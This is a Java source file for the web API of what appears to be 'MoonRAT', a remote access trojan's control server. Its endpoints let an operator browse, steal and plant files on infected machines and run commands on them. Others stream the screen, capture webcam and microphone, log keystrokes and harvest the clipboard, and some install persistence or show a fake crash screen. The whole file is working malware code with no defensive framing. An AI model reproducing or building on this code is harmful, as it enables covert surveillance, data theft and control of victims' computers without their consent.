package moonrat.server;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Map;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

import static moonrat.Protocol.*;

final class ApiHandler implements HttpHandler {
    private final AgentRegistry registry;

    ApiHandler(AgentRegistry registry) {
        this.registry = registry;
    }

    @Override
    public void handle(HttpExchange exchange) throws IOException {
        String path = exchange.getRequestURI().getPath();
        Map<String, String> query = HttpUtil.parseQuery(exchange.getRequestURI().getQuery());

        try {
            if (path.startsWith("/api/")) {
                if (Auth.handle(exchange, path, query, exchange.getRequestMethod())) return;
                if (Auth.identify(exchange) == null) {
                    HttpUtil.send(exchange, 401, "application/json",
                            "{\"error\":\"unauthorized\"}".getBytes(StandardCharsets.UTF_8));
                    return;
                }
            }

            if (path.equals("/") || path.equals("/index.html")) {
                StaticFiles.serve(exchange, "index.html");
                return;
            }
            if (path.equals("/login.html")) {
                StaticFiles.serve(exchange, "login.html");
                return;
            }
            if (path.startsWith("/static/")) {
                StaticFiles.serve(exchange, path.substring(1));
                return;
            }

            if (path.equals("/api/agents")) {
                listAgents(exchange);
                return;
            }

            if (path.startsWith("/api/agents/")) {
                routeAgent(exchange, path, query);
                return;
            }

            if (path.startsWith("/api/")) {
                HttpUtil.send(exchange, 404, "application/json",
                        ("{\"error\":\"unknown endpoint: " + HttpUtil.esc(path) + "\"}").getBytes(StandardCharsets.UTF_8));
                return;
            }
            HttpUtil.send(exchange, 404, "text/plain; charset=utf-8", "not found".getBytes(StandardCharsets.UTF_8));
        } catch (Exception failure) {
            String message = failure.getMessage() == null ? failure.toString() : failure.getMessage();
            HttpUtil.send(exchange, 500, "text/plain; charset=utf-8", ("error: " + message).getBytes(StandardCharsets.UTF_8));
        }
    }

    private void listAgents(HttpExchange exchange) throws IOException {
        StringBuilder json = new StringBuilder("[");
        boolean first = true;
        for (AgentConnection agent : registry.all()) {
            if (!first) json.append(',');
            first = false;
            json.append("{\"id\":\"").append(HttpUtil.esc(agent.id))
                    .append("\",\"host\":\"").append(HttpUtil.esc(agent.host))
                    .append("\",\"user\":\"").append(HttpUtil.esc(agent.user))
                    .append("\",\"os\":\"").append(HttpUtil.esc(agent.os))
                    .append("\",\"env\":\"").append(HttpUtil.esc(agent.env)).append("\"}");
        }
        HttpUtil.send(exchange, 200, "application/json", json.append(']').toString().getBytes(StandardCharsets.UTF_8));
    }

    private void routeAgent(HttpExchange exchange, String path, Map<String, String> query) throws IOException {
        String[] parts = path.substring("/api/agents/".length()).split("/", 2);
        String id = parts[0];
        String action = parts.length > 1 ? parts[1] : "";

        AgentConnection agent = registry.get(id);
        if (agent == null) {
            HttpUtil.send(exchange, 404, "application/json",
                    "{\"error\":\"agent offline\"}".getBytes(StandardCharsets.UTF_8));
            return;
        }

        switch (action) {
            case "ls":
                listDirectory(exchange, agent, query);
                return;
            case "get":
                download(exchange, agent, query);
                return;
            case "shot":
                screenshot(exchange, agent);
                return;
            case "stream":
                stream(exchange, agent, id, query);
                return;
            case "zip":
                archive(exchange, agent, query);
                return;
            case "bsod":
                simple(exchange, agent, BSOD_REQ, 20, bsodFields(query));
                return;
            case "sound":
                simple(exchange, agent, SOUND_REQ, 90,
                        new String[]{query.getOrDefault("kind", "error"), query.getOrDefault("text", "")});
                return;
            case "notify":
                simple(exchange, agent, NOTIFY_REQ, 40,
                        new String[]{query.getOrDefault("title", "MoonRAT"), query.getOrDefault("body", "")});
                return;
            case "keylog":
                keylog(exchange, agent, query);
                return;
            case "put":
                upload(exchange, agent, query);
                return;
            case "run":
                runFile(exchange, agent, query);
                return;
            case "exec":
                execute(exchange, agent, query);
                return;
            case "game":
                game(exchange, agent, query);
                return;
            case "persist":
                persist(exchange, agent, query);
                return;
            case "selfdestruct":
                selfDestruct(exchange, agent);
                return;
            case "cam":
                camera(exchange, agent);
                return;
            case "mic":
                microphone(exchange, agent, query);
                return;
            case "clip":
                clipboard(exchange, agent, query);
                return;
            default:
                HttpUtil.send(exchange, 404, "application/json",
                        ("{\"error\":\"unknown endpoint: " + HttpUtil.esc(path) + "\"}").getBytes(StandardCharsets.UTF_8));
        }
    }

    private String[] bsodFields(Map<String, String> query) {
        int seconds = HttpUtil.clamp(query.get("sec"), 1, 3600, 15);
        return new String[]{String.valueOf(seconds)};
    }

    private void listDirectory(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
        String directory = query.get("path");
        if (directory == null || directory.isEmpty()) {
            directory = agent.os.toLowerCase().contains("win") ? "C:\\" : "/";
        }

        Frame frame = agent.request(LS_REQ, directory);
        if (!frame.field(0).isEmpty()) throw new IOException(frame.field(0));

        StringBuilder json = new StringBuilder("{\"path\":\"").append(HttpUtil.esc(frame.field(1)))
                .append("\",\"entries\":[");
        boolean first = true;
        for (String line : frame.field(2).split("\n")) {
            if (line.isEmpty()) continue;
            String[] columns = line.split("\t", 3);
            if (!first) json.append(',');
            first = false;
            json.append("{\"name\":\"").append(HttpUtil.esc(columns[0]))
                    .append("\",\"dir\":").append(columns[1].equals("1"))
                    .append(",\"size\":").append(columns[2]).append('}');
        }
        json.append("]}");
        HttpUtil.send(exchange, 200, "application/json", json.toString().getBytes(StandardCharsets.UTF_8));
    }

    private void download(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
        String file = query.get("path");
        Frame frame = agent.request(GET_REQ, file == null ? "" : file);
        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 404, "text/plain; charset=utf-8", frame.field(0).getBytes(StandardCharsets.UTF_8));
            return;
        }

        exchange.getResponseHeaders().set("Content-Type", "application/octet-stream");
        exchange.getResponseHeaders().set("Content-Disposition", HttpUtil.contentDisposition(frame.field(1)));
        exchange.getResponseHeaders().set("Cache-Control", "no-store");
        exchange.sendResponseHeaders(200, frame.blob.length);
        try (OutputStream out = exchange.getResponseBody()) {
            out.write(frame.blob);
        }
    }

    private void screenshot(HttpExchange exchange, AgentConnection agent) throws IOException {
        Frame frame = agent.request(SHOT_REQ);
        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 500, "text/plain; charset=utf-8", frame.field(0).getBytes(StandardCharsets.UTF_8));
            return;
        }

        exchange.getResponseHeaders().set("Content-Type", "image/jpeg");
        exchange.getResponseHeaders().set("Cache-Control", "no-store");
        exchange.sendResponseHeaders(200, frame.blob.length);
        try (OutputStream out = exchange.getResponseBody()) {
            out.write(frame.blob);
        }
    }

    private void stream(HttpExchange exchange, AgentConnection agent, String id, Map<String, String> query) throws IOException {
        int fps = HttpUtil.clamp(query.get("fps"), 1, 60, 24);
        int quality = HttpUtil.clamp(query.get("q"), 10, 95, 70);
        int width = HttpUtil.clamp(query.get("w"), 320, 3840, 1920);
        long frameDelay = Math.max(1, 1000 / fps);

        exchange.getResponseHeaders().set("Content-Type", "multipart/x-mixed-replace; boundary=frame");
        exchange.getResponseHeaders().set("Cache-Control", "no-store");
        exchange.sendResponseHeaders(200, 0);

        try (OutputStream out = exchange.getResponseBody()) {
            while (registry.isCurrent(agent)) {
                long started = System.currentTimeMillis();
                Frame frame = agent.request(SHOT_REQ, 10, new byte[0],
                        String.valueOf(width), String.valueOf(quality));
                if (!frame.field(0).isEmpty()) break;

                out.write(("--frame\r\nContent-Type: image/jpeg\r\nContent-Length: "
                        + frame.blob.length + "\r\n\r\n").getBytes(StandardCharsets.US_ASCII));
                out.write(frame.blob);
                out.write("\r\n".getBytes(StandardCharsets.US_ASCII));
                out.flush();

                long spent = System.currentTimeMillis() - started;
                if (spent < frameDelay) Thread.sleep(frameDelay - spent);
            }
        } catch (Exception ignored) {
        }
    }

    private void archive(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
        String directory = query.get("path");
        if (directory == null || directory.isEmpty()) {
            directory = agent.os.toLowerCase().contains("win") ? "C:\\" : "/";
        }

        Frame frame = agent.request(ZIP_REQ, 90, new byte[0], directory);
        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 500, "text/plain; charset=utf-8", frame.field(0).getBytes(StandardCharsets.UTF_8));
            return;
        }

        exchange.getResponseHeaders().set("Content-Type", "application/zip");
        exchange.getResponseHeaders().set("Content-Disposition", HttpUtil.contentDisposition(frame.field(1)));
        exchange.getResponseHeaders().set("Cache-Control", "no-store");
        exchange.sendResponseHeaders(200, frame.blob.length);
        try (OutputStream out = exchange.getResponseBody()) {
            out.write(frame.blob);
        }
    }

    private void simple(HttpExchange exchange, AgentConnection agent, int type, int timeoutSeconds, String[] fields)
            throws IOException {
        Frame frame = agent.request(type, timeoutSeconds, new byte[0], fields);
        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 500, "application/json",
                    ("{\"error\":\"" + HttpUtil.esc(frame.field(0)) + "\"}").getBytes(StandardCharsets.UTF_8));
            return;
        }
        HttpUtil.send(exchange, 200, "application/json", "{\"ok\":true}".getBytes(StandardCharsets.UTF_8));
    }

    private void game(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
        String action = query.getOrDefault("action", "info");
        String argument = query.getOrDefault("arg", "");
        Frame frame = agent.request(GAME_REQ, 15, new byte[0], action, argument);

        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 500, "application/json",
                    ("{\"error\":\"" + HttpUtil.esc(frame.field(0)) + "\"}").getBytes(StandardCharsets.UTF_8));
            return;
        }

        if ("log".equals(action)) {
            exchange.getResponseHeaders().set("Content-Type", "text/plain; charset=utf-8");
            exchange.getResponseHeaders().set("Cache-Control", "no-store");
            exchange.sendResponseHeaders(200, frame.blob.length);
            try (OutputStream out = exchange.getResponseBody()) {
                out.write(frame.blob);
            }
            return;
        }

        String json;
        if ("send".equals(action)) {
            json = "{\"ok\":true}";
        } else {
            json = "{\"pid\":\"" + HttpUtil.esc(frame.field(1))
                    + "\",\"dir\":\"" + HttpUtil.esc(frame.field(2))
                    + "\",\"plugins\":\"" + HttpUtil.esc(frame.field(3)) + "\"}";
        }
        HttpUtil.send(exchange, 200, "application/json", json.getBytes(StandardCharsets.UTF_8));
    }

    private void keylog(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
        String action = query.getOrDefault("action", "dump");
        Frame frame = agent.request(KEYLOG_REQ, 20, new byte[0], action);
        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 500, "application/json",
                    ("{\"error\":\"" + HttpUtil.esc(frame.field(0)) + "\"}").getBytes(StandardCharsets.UTF_8));
            return;
        }
        String json = "{\"ok\":true,\"text\":\"" + HttpUtil.esc(frame.field(1)) + "\"}";
        HttpUtil.send(exchange, 200, "application/json", json.getBytes(StandardCharsets.UTF_8));
    }

    private void persist(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
        String action = query.getOrDefault("action", "status");
        String mode = query.getOrDefault("mode", "auto");
        Frame frame = agent.request(PERSIST_REQ, 40, new byte[0], action, mode);
        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 500, "application/json",
                    ("{\"error\":\"" + HttpUtil.esc(frame.field(0)) + "\"}").getBytes(StandardCharsets.UTF_8));
            return;
        }
        String json = "{\"ok\":true,\"output\":\"" + HttpUtil.esc(frame.field(1)) + "\"}";
        HttpUtil.send(exchange, 200, "application/json", json.getBytes(StandardCharsets.UTF_8));
    }

    private void selfDestruct(HttpExchange exchange, AgentConnection agent) throws IOException {
        Frame frame = agent.request(PERSIST_REQ, 20, new byte[0], "selfdestruct", "");
        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 500, "application/json",
                    ("{\"error\":\"" + HttpUtil.esc(frame.field(0)) + "\"}").getBytes(StandardCharsets.UTF_8));
            return;
        }
        String json = "{\"ok\":true,\"output\":\"" + HttpUtil.esc(frame.field(1)) + "\"}";
        HttpUtil.send(exchange, 200, "application/json", json.getBytes(StandardCharsets.UTF_8));
    }

    private void camera(HttpExchange exchange, AgentConnection agent) throws IOException {
        Frame frame = agent.request(CAM_REQ, 60, new byte[0], "");
        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 500, "text/plain; charset=utf-8", frame.field(0).getBytes(StandardCharsets.UTF_8));
            return;
        }
        exchange.getResponseHeaders().set("Content-Type", "image/jpeg");
        exchange.getResponseHeaders().set("Cache-Control", "no-store");
        exchange.sendResponseHeaders(200, frame.blob.length);
        try (OutputStream out = exchange.getResponseBody()) {
            out.write(frame.blob);
        }
    }

    private void microphone(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
        int seconds = HttpUtil.clamp(query.get("sec"), 1, 120, 5);
        Frame frame = agent.request(MIC_REQ, seconds + 30, new byte[0], String.valueOf(seconds));
        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 500, "text/plain; charset=utf-8", frame.field(0).getBytes(StandardCharsets.UTF_8));
            return;
        }
        exchange.getResponseHeaders().set("Content-Type", "audio/wav");
        exchange.getResponseHeaders().set("Cache-Control", "no-store");
        exchange.sendResponseHeaders(200, frame.blob.length);
        try (OutputStream out = exchange.getResponseBody()) {
            out.write(frame.blob);
        }
    }

    private void clipboard(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
        String action = query.getOrDefault("action", "history");
        String since = query.getOrDefault("since", "0");
        Frame frame = agent.request(CLIP_REQ, 15, new byte[0], action, since);
        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 500, "application/json",
                    ("{\"error\":\"" + HttpUtil.esc(frame.field(0)) + "\"}").getBytes(StandardCharsets.UTF_8));
            return;
        }
        String json = "{\"ok\":true,\"total\":" + frame.field(1)
                + ",\"text\":\"" + HttpUtil.esc(frame.field(2)) + "\"}";
        HttpUtil.send(exchange, 200, "application/json", json.getBytes(StandardCharsets.UTF_8));
    }

    private void upload(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
        String file = query.get("path");
        if (file == null || file.isEmpty()) {
            HttpUtil.send(exchange, 400, "application/json", "{\"error\":\"no path\"}".getBytes(StandardCharsets.UTF_8));
            return;
        }
        if (!exchange.getRequestMethod().equalsIgnoreCase("POST")) {
            HttpUtil.send(exchange, 405, "application/json", "{\"error\":\"use POST\"}".getBytes(StandardCharsets.UTF_8));
            return;
        }

        long offsetBase = 0;
        try {
            String offsetArg = query.get("offset");
            if (offsetArg != null && !offsetArg.isEmpty()) offsetBase = Long.parseLong(offsetArg);
        } catch (NumberFormatException ignored) {
        }

        InputStream body = exchange.getRequestBody();
        int chunkSize = 4 * 1024 * 1024;
        byte[] buffer = new byte[chunkSize];
        long total = 0;
        int read;

        while ((read = body.read(buffer)) > 0) {
            byte[] chunk;
            if (read == chunkSize) {
                chunk = buffer;
                buffer = new byte[chunkSize];
            } else {
                chunk = Arrays.copyOf(buffer, read);
            }

            Frame frame = agent.request(PUT_REQ, 45, chunk, file, String.valueOf(offsetBase + total));
            if (!frame.field(0).isEmpty()) {
                HttpUtil.send(exchange, 500, "application/json",
                        ("{\"error\":\"" + HttpUtil.esc(frame.field(0)) + "\"}").getBytes(StandardCharsets.UTF_8));
                return;
            }
            total += read;
        }

        HttpUtil.send(exchange, 200, "application/json",
                ("{\"ok\":true,\"bytes\":" + total + "}").getBytes(StandardCharsets.UTF_8));
    }

    private void runFile(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
        String file = query.get("path");
        String arguments = query.getOrDefault("args", "");
        Frame frame = agent.request(RUN_REQ, 20, new byte[0], file == null ? "" : file, arguments);

        if (!frame.field(0).isEmpty()) {
            HttpUtil.send(exchange, 500, "application/json",
                    ("{\"error\":\"" + HttpUtil.esc(frame.field(0)) + "\"}").getBytes(StandardCharsets.UTF_8));
            return;
        }

        String pid = frame.field(1).isEmpty() ? "null" : frame.field(1);
        HttpUtil.send(exchange, 200, "application/json",
                ("{\"ok\":true,\"pid\":" + pid + "}").getBytes(StandardCharsets.UTF_8));
    }

    private void execute(HttpExchange exchange, AgentConnection agent, Map<String, String> query) throws IOException {
        String command = query.get("cmd");
        if (command == null || command.isEmpty()) {
            HttpUtil.send(exchange, 400, "application/json",
                    "{\"error\":\"empty command\"}".getBytes(StandardCharsets.UTF_8));
            return;
        }

        Frame frame = agent.request(EXEC_REQ, 75, new byte[0], command);
        String json = "{\"exit\":" + frame.field(0)
                + ",\"error\":\"" + HttpUtil.esc(frame.field(1))
                + "\",\"output\":\"" + HttpUtil.esc(new String(frame.blob, StandardCharsets.UTF_8)) + "\"}";
        HttpUtil.send(exchange, 200, "application/json", json.getBytes(StandardCharsets.UTF_8));
    }
}
